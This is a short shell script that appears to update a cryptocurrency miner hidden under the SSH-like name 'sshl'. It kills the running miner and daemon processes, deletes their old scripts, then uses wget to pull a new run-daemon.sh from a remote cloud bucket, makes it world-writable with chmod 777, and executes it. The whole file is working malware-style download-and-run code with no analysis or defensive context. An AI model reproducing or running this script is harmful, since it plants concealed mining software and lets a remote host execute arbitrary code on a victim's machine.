#!/bin/sh
#update version
dir="/usr/sshl/"
shell="run.sh"
shellPath=$dir$shell

miner="sshl"
minerPath=$dir$miner

daemon="/var/run-daemon.sh"

# update 
kill -s 9 `ps -aux | grep run-daemon | awk '{print $2}'`
kill -s 9 `ps -aux | grep sshl | awk '{print $2}'`

rm -rf $shellPath
rm -rf $daemon

#exec
wget -O /var/run-daemon.sh https://skyxxx.oss-cn-beijing.aliyuncs.com/run-daemon.sh && chmod 777 /var/run-daemon.sh && sh /var/run-daemon.sh
echo 'import finish'
